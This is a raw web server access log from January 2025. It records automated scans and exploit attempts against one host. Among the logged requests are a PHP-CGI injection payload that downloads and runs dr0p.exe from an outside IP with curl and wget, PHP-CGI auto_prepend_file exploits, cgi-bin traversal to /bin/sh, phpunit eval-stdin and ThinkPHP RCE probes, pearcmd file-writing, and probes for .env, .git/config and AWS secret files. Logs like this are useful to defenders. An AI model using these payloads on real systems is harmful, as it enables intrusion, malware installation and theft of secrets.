193.41.206.24 - - [09/Jan/2025:16:35:29 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:30 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:32 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:34 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:35 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:37 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:38 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:40 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:43 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:45 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:47 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:49 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
185.16.39.104 - - [09/Jan/2025:16:49:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.121.79.3 - - [09/Jan/2025:16:52:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.125.13 - - [09/Jan/2025:16:59:17 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
87.120.125.13 - - [09/Jan/2025:16:59:44 +0000] "GET / HTTP/1.1" 200 947 "http://35.220.248.27/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>" "Go-http-client/1.1"
78.153.140.93 - - [09/Jan/2025:17:02:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:17:02:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:17:15:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:17:25:27 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
93.174.93.12 - - [09/Jan/2025:17:25:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
152.42.219.47 - - [09/Jan/2025:17:27:08 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [09/Jan/2025:17:27:16 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
83.222.191.146 - - [09/Jan/2025:17:29:53 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.93 - - [09/Jan/2025:18:07:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:07:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+allow_url_include%3Don+%ADd+auto_prepend_file%3Dphp%3A//input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:01 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
185.196.9.31 - - [09/Jan/2025:18:28:22 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.8.0.10"
45.95.147.253 - - [09/Jan/2025:18:35:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
78.153.140.93 - - [09/Jan/2025:18:44:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:44:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
209.145.53.161 - - [09/Jan/2025:18:44:27 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:28 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:29 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:29 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:30 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:31 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:31 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:32 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:32 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:33 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:33 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:34 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:35 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:35 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:36 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:37 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:38 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:38 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:39 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:40 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:40 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:41 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:42 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:42 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:43 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:44 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:46 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:46 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:49 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:49 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:51 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:51 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:52 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:53 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:53 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:54 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
139.59.101.104 - - [09/Jan/2025:19:14:36 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
179.43.191.146 - - [09/Jan/2025:19:36:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:19:39:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "WebCopier v4.6"
45.156.129.130 - - [09/Jan/2025:19:48:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
91.223.3.201 - - [09/Jan/2025:19:57:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:19:57:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:19:57:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [09/Jan/2025:20:07:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.121.79.3 - - [09/Jan/2025:20:20:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [09/Jan/2025:20:42:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [09/Jan/2025:20:48:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.29 - - [09/Jan/2025:21:05:11 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.29 - - [09/Jan/2025:21:05:11 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:21:14:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:21:14:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.15.19.32 - - [09/Jan/2025:21:16:56 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
51.15.19.32 - - [09/Jan/2025:21:16:57 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/cgi-bin/luci/;stok=/locale" "-"
78.153.140.93 - - [09/Jan/2025:21:24:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:21:24:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:21:27:39 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
46.19.138.234 - - [09/Jan/2025:21:40:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
222.118.254.5 - - [09/Jan/2025:21:41:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [09/Jan/2025:21:48:06 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.215.236.132 - - [09/Jan/2025:21:49:24 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Infinix X624B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.0.1207 Mobile Safari/537.36"
206.168.34.214 - - [09/Jan/2025:21:53:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.214 - - [09/Jan/2025:21:54:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:10 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:11 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:11 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
91.223.3.201 - - [09/Jan/2025:22:02:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.129.57 - - [09/Jan/2025:22:03:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
85.46.111.41 - - [09/Jan/2025:22:17:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.200.78.250 - - [09/Jan/2025:22:25:01 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
193.34.212.75 - - [09/Jan/2025:22:35:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [09/Jan/2025:22:38:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:22:38:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:22:56:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [09/Jan/2025:22:58:28 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [09/Jan/2025:22:58:28 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
49.51.204.74 - - [09/Jan/2025:23:01:24 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
87.120.115.34 - - [09/Jan/2025:23:07:20 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0"
95.214.55.226 - - [09/Jan/2025:23:10:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
92.255.57.58 - - [09/Jan/2025:23:18:55 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:23:42:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:23:42:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
